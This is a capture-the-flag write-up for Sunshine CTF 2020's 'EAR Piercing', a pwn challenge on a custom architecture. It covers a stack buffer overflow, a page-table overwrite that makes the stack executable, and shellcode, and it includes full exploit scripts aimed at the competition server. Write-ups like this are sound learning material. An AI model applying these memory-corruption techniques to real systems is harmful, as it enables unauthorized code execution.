# Sunshine CTF 2020 - EAR Piercing

#### - **Category** : Pegasus  
#### - **Points** : 500 Pts  
#### - **Solves** : 1

### Background

The Pegasus category was a scattering of challenges all relating to a custom
Architecture that was created by the Authors. I won't go into how the
architecture works or what is different besides what is needed, this is the
hardest challenge of the bunch and as such there are probably other writeups
along with the documentation if the reader is interested in further analysis.

This challenge released with around 12 hours left in the competition along
with a "bof.peg" and  "peg_pwn_checker.so" file, the peg_pwn_checker.so file
opens the flag and puts the data into the 15th channel to read from when the
challenger has an ability to do so, and will send any channel data to the user
when written to, when the challenge first released I ran into problems of
running this checker correctly in my environment and ended up modifying a
previous checker that would only send data from channel 0 to the user, this
only really affects the final shellcode, but my approach... while convoluted,
ended up sending to channel 0 anyways.

I will walk through my approach on exploitation and discuss why possibly
looking at the documentation longer would be more beneficial as after the
competition I was informed of a much easier method to get execution.

### Bof.peg

Using the runpeg file, I was able to use the debugger ability to dump the
entire assembly:

```  
read:  
0100.0000: MOV     R4, ZERO  
0102.0000: MOV     R6, ZERO  
0104.0000: BRR     0x1A  
0107.0000: CMP     R5,  0xA  
010B.0000: STB.EQ  [RV], R6  
010D.0000: BRR.EQ  0x1B  
0110.0000: MOV     R4, R4  
0112.0000: BRR.EQ  0x8  
0115.0000: ORR     R6, 0x80  
0119.0000: STB     [RV], R6  
011B.0000: INC     RV, 1  
011D.0000: MOV     R6, R5  
011F.0000: INC     R4, 1  
0121.0000: RDB     R5, (0)  
0123.0000: BRR.LT  0xFFE1  
0126.0000: MOV     RV, R5  
0128.0000: BRR     0x2  
012B.0000: MOV     RV, R4  
012D.0000: BRA     RD, RA  
print:  
012F.0000: MOV     RV, RV  
0131.0000: BRA.EQ  RD, RA  
0133.0000: MOV     R5, 0x7F  
0137.0000: LDB     R3, [RV]  
0139.0000: INC     RV, 1  
013B.0000: AND     R4, R3, R5  
013E.0000: WRB     (0), R4  
0140.0000: CMP     R3,  R4  
0142.0000: BRR.GT  0xFFF2  
0145.0000: BRA     RD, RA

Extra:  
0147.0000: PSH     {RA-RD}  
014A.0000: PSH     RV, {R3-R7}  
014E.0000: POP     {PC-DPC}  
login:  
0151.0000: PSH     {R3-R8, RA-RD}  
0154.0000: MOV     FP, SP  
0156.0000: SUB     SP, 0x32  
015A.0000: MOV     R8, RV  
015C.0000: ADD     RV, PC, 0x51 //load string  
0161.0000: FCR     0xFFCB  
0164.0000: MOV     RV, R8  
0166.0000: FCR     0xFFC6 //print  
0169.0000: WRB     (0), 0x3A  
016C.0000: WRB     (0), 0x20  
016F.0000: MOV     RV, SP  
0171.0000: FCR     0xFF8C //read2  
0174.0000: ADD     RV, PC, 0x4C  
0179.0000: FCR     0xFFB3  
017C.0000: MOV     RV, ZERO  
017E.0000: MOV     SP, FP  
0180.0000: POP     {R3-R8, PC-DPC}  
main:  
0183.0000: SUB     SP, 0x32  
0187.0000: ADD     RV, PC, 0x16 //first string  
018C.0000: FCR     0xFFA0 //print  
018F.0000: MOV     RV, SP  
0191.0000: FCR     0xFF6C //read  
0194.0000: MOV     RV, SP  
0196.0000: FCR     0xFFB8 //login, prints second string and reads data again  
0199.0000: ADD     RV, PC, 0x27 // other string  
019E.0000: FCR     0xFF8E  
01A1.0000: HLT  
```

Above we can see the control flow of the program, a string is printed, the
username is read into the stack, then in the login function the second string
is printed with our username, then finally the password is read into the stack
as well. These reads in the stack are a direct buffer overflow and with
precision can cause a rop-ish chain to ensue at the end of login

`0180.0000: POP     {R3-R8, PC-DPC}`

The only problem comes from how characters are interpreted in this system, in
the read function you may notice the OR with 0x80, the end of a string is not
determined by null bytes but by whether the last character in the string has
the 0x80 on it or not, and when the data is read in up until the last
character the 0x80 are added to the characters so a string like `TEST` becomes
`\xd4\xc5\xd3T` in memory. Since this memory system is little endian though
this still allows us to control the PC as the address 0x0180 and up can be
used.

```  
fa80: 0000 0000 0000 0000 0000 e2e2 e2e2 e2e2  ................  
fa90: e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2  ................  
faa0: e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2  ................  
fab0: e2e2 e2e2 e2e2 e2e2 e2e2 e262 2000 3200  ...........b .2.  
fac0: 0a00 6100 2aea 0000 00fb 9901 0000 e1e1  ..a.*...........  
fad0: e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1  ................  
fae0: e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1  ................  
faf0: e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e161  ...............a  
```

In the hexdump above is what our stack looks like after the two writes, the
0xe2's are the character 'b' after the OR and the 0xe1 are 'a's. As you can
see the last character in the string stays to delaminate the ending of a
string. At byte location 0xfaca is where the pop PC and POP DPC would take
place meaning DPC will remain zero if we carefully overwrite the PC counter.
Now the question is how do you continue from here, some may notice that after
the last two pops that the stack pointer still points at our username string,
meaning if we jump back to another pop we can control a wide range of
instructions. Problem with this is that we are still limited to the 0x80
problem, or are we.

Since the last character will be correctly set and our stack is essentially in
the same location we started in, what happens if we jump back to 0x18f and go
through both read operations again, but send in one less character on our
username string?

```  
fa80: 0000 0000 0000 0000 0000 e2e2 e2e2 e2e2  ................  
fa90: e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2  ................  
faa0: e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2  ................  
fab0: e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2 e2e2  ................  
fac0: e2e2 e2e2 e2e2 e2e2 e2e2 8f01 0000 e1e1  ................  
fad0: e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1  ................  
fae0: e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1  ................  
faf0: e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 e1e1 6161  ..............aa  
```

We can see that we can effectively walk our way back character by character to
send whatever characters we want onto the stack!

### Objective and Exploit

Now is a good time to talk about our objective and how we want to go about
exploiting this binary, while in debug mode you can run the `vmmap` command to
get a list of the loaded memory segments, in the documentation there is
greater detail on how this is setup. What we care about is the fact that there
are no pages that are both writeable and executable at the same time, to
bypass this we will need to effectively overwrite the virtual page table
itself. This is always located at an offset of 0xfc00 and contains the
information about the current virtual table, each 4 bytes corresponds to a
page, with what the Readable page, Writeable page, Executable page, and Fault
Page are by the byte value for each.

```  
$ vmmap  
0000-0100: R=00 W=00 X=00 fault=0000  
0100-0200: R=12 W=00 X=12 fault=0000  
0200-EA00: R=00 W=00 X=00 fault=0000  
EA00-EB00: R=00 W=00 X=00 fault=F000  
EB00-FB00: R=02 W=02 X=00 fault=0000  
FB00-FC00: R=00 W=00 X=00 fault=FB00  
FC00-FFFF: R=FC W=FC X=00 fault=0000  
$ hexdump R 0xfc00 16  
fc00: 0000 0000 1200 1200 0000 0000 0000 0000  ................

```

From the debugger we can confirm this, with vmmap showing that the addresses
from 0x100 - 0x200 are located at page 0x12 and at 0xfc00 the second 4 byte
range also points to the 0x12 page. This is important because if we can get an
overwrite to this table we can possibly execute arbitrary shellcode.

This becomes a bit tricky as our input is always OR'ed with 0x80, but the
stack points to the page at 0xfa00 which is actually loaded at the 0x11 page
in physical memory, and we can send in the byte 0x11 if it's our only byte,
this means our target has effectively become the overwrite of the virtual page
table to have the stack become executable by it's own page.

There are two approaches to this 1 get an instruction that will store the byte
from another register into that location, this could work since we essentially
own a large number of registers, but I was unable to find a great instruction
that would allow us to continue with our control from that point on. Second
option is to jump right between these two instructions:

```  
018F.0000: MOV     RV, SP  
0191.0000: FCR     0xFF6C //read  
```

The read function uses the RV register, R2, to control where the data is being
read into.

This is were I got stuck for a bit, I tried for the longest time to try to
change SP to just point there then do this, but 1 any gadget that would
actually pop into SP was lying... looking at you `0E.0000: POP.EQ  {FP-SP, PC-
DPC}`. And yes I know that I was hitting it correctly even though it was a pop
if equal, I was making sure it was equal, more on this later.

After a long time searching I created this python script:

```python  
from pwn import *  
import time

p = process('./runpeg --plugin peg_rev_checker.so --debug ./bof.peg'.split())

for y in range(0x100, 0x1a1):  
   for x in range(0, 0x1a1):  
       p.sendline('disassemble 1 {} {}'.format(str(hex(y)),str(hex(x))))  
       p.readuntil(str(hex(x))[2:].upper())  
       t = p.readline().strip()  
       if "Execute" in t or "Failed" in t:  
           continue  
       print hex(y),hex(x),t  
```

This script brute force checks each address with the DPC value to find all
hidden instructions as well, if you are wondering what the DPC actually does,
my understanding is that a normal instruction will read byte by byte to figure
out what the code stands for. Where the DPC can change that from byte to byte,
to 2 bytes between each opcode, and so on. So after a quick brute force a lot
of the instructions are useless except this jewel

`0x10e 0x20 : POP.EQ  {RV-R3, R6-R7, PC-DPC}`

So if the Zero flag is set we can effectively get straight control of RV!
After some more looking I also found this instruction which allowed for an
easy set of the Zero flag.

```  
014C.0000: RDB     ZERO, (0)  
014E.0000: POP     {PC-DPC}  
```

This instruction will read a byte from the user and store it in the Zero
register which is essentially reading in the byte but don't do anything except
update flags. Then we can just jump straight to this pop.equal instruction
from there. After this pop we should be at the location 0x191 about to call
the read function were the RV register equals 0xffea, sending in the 0x11 byte
along should cause the page table to think the stack is now executable and
since the control flow hasn't really changed, the login function should be
called next with our stack pointer still being overwritable. Which we can
store some shellcode into the stack from the initial write if we still have
space which it is close, but we make it with 7characters to spare. Then we use
one last overwrite to jump to our shellcode, which is shown below.

```  
@.top:  
	RDB R2, (0xf)   
	WRB R2  
	BRR @.top  
```

Compiled down we get the bytes `\xf8\x2f\xf9\x02\xf5\xf9\xff, the one downside
to this shellcode is that it will run forever once hit, but that does not
matter too much.

```  
$ vmmap  
0000-0100: R=00 W=00 X=00 fault=0000  
0100-0200: R=12 W=00 X=12 fault=0000  
0200-EA00: R=00 W=00 X=00 fault=0000  
EA00-EB00: R=00 W=00 X=00 fault=F000  
EB00-FA00: R=02 W=02 X=00 fault=0000  
FA00-FB00: R=11 W=11 X=11 fault=0000  
FB00-FC00: R=00 W=00 X=00 fault=FB00  
FC00-FFFF: R=FC W=FC X=00 fault=0000  
$ hexdump R 0xfaf2 8  
faf2: ecbf ceff ece6 0000                      ........  
```

Here we can see that our method works so far and was able to correctly setup
the stack, virtual table, and shellcode. All that is left is to jump to the
shellcode and enjoy our flag!

### Code

```python  
from pwn import *  
import time

context.log_level = 'error'

p = remote('chal.2020.sunshinectf.org',10004)

exploit1 = "ABCD" + 'a'*10 + '\x4c\x01\x00\x00'+'\x0e\x01\x20\x00' +
'\xea\xff' + '\x00'*8 + '\x91\x01\x00\x00' + '\xf8\x2f\xf9\x02\xf5\xf9\xff'  
exploit = 'b'*64 + '\x8f\x01'

#get official bytes into the stack  
for x in range(len(exploit1)-14):  
   print x  
   time.sleep(.1)  
   p.sendline(exploit1[:len(exploit1)-x])  
   p.sendlineafter('ABCD',exploit)  
   time.sleep(.1)

exploit = '\xff'*64 + '\x80\x01' #start the Ropish chain  
p.sendline(exploit1[:4])  
p.sendlineafter('ABCD',exploit)

time.sleep(.1)  
p.send('\x00') #Set Zero flag

time.sleep(.1)  
p.sendline('\x11') #overwrite the page table  
time.sleep(.1)

exploit ='\xff'*64 + '\xf2\xfa' # jump to shellcode  
p.sendline(exploit)  
p.readuntil('x/: Login success!\n')  
time.sleep(1)  
flag = p.readline()  
p.close()  
print "Enjoy your flag:",flag  
```

### Flag

`sun{wh47_4_ju1cy_4rch1t3c7ur3_4_pwn1ng!}`

### Notes and Second method

While the above code is better optimized, in my original exploit I failed to
realize that the stack was located at page 0x11 and overwrote it with 0xfa,
meaning I had to go through a bunch more work to actually write shellcode to
the stack, best part is I got really confused when my stack instantly became
all 0's after the overwrite and never thought a second about it.

Second as I had mentioned earlier, my exploit became convoluted and there was
a much easier approach sitting right in front of me the entire time.

```  
014A.0000: PSH     RV, {R3-R7}  
014E.0000: POP     {PC-DPC}  
```

The instruction I partially used to set the zero flag was actually a push into
the RV register, which at most cases would be equal to zero. Upon the pushes
RV underflows into 0xfff0, meaning we have an instant write straight into the
virtual table, allowing us to jump to our shellcode much easier, or put
shellcode into the 0xff00 page, below is an example of overwriting the 0xff
page executable page to point to our stack address where our shellcode will
still sit. From this method you get 10 bytes to write to at 0xfff6:

```  
$ hexdump R 0xfff6 10  
fff6: ffff ffff ffff ffff ffff                 ..........  
```

With the second most byte needing to be 0xff if you want to execute there,
leaving you with around 7 bytes of shellcode, which could be a bit tight, and
if you went in one attempt you would need to have shellcode that is only above
0x80, which I couldn't get anything working with the read and write
primatives.

But here is a script that will change the 0xff page to point to the stack
making it executable at address 0xff00 instead of 0xfa00

```  
from pwn import *  
import time

context.log_level = 'error'

p = remote('chal.2020.sunshinectf.org',10004)

exploit1 = "ABCD" + '\xff'*4 + '\x11\x11' + '\xff'*4 +'\x4a\x01\x00\x00'
+'\xe4\xff\x00\x00'+'\xf8\x2f\xf9\x02\xf5\xf9\xff'  
exploit = 'a'*64 +'\x8f'

#get official bytes into the stack  
for x in range(21):  
   print x  
   time.sleep(.1)  
   p.sendline(exploit1[:len(exploit1)-x])  
   p.sendlineafter('ABCD',exploit)  
   #p.interactive()  
   time.sleep(.1)

exploit = '\xff'*64 + '\x80\x01' #start the Ropish chain  
p.sendline('ABCD')  
p.sendlineafter('ABCD',exploit)  
#p.interactive()

p.readuntil('Login success!\n')  
time.sleep(1)  
flag = p.readline()  
p.close()  
print "Enjoy your flag:",flag  
```

Original writeup
(https://github.com/kernelpoppers/ctf_writeups/tree/master/Sunshine_2020/EAR_Piercing).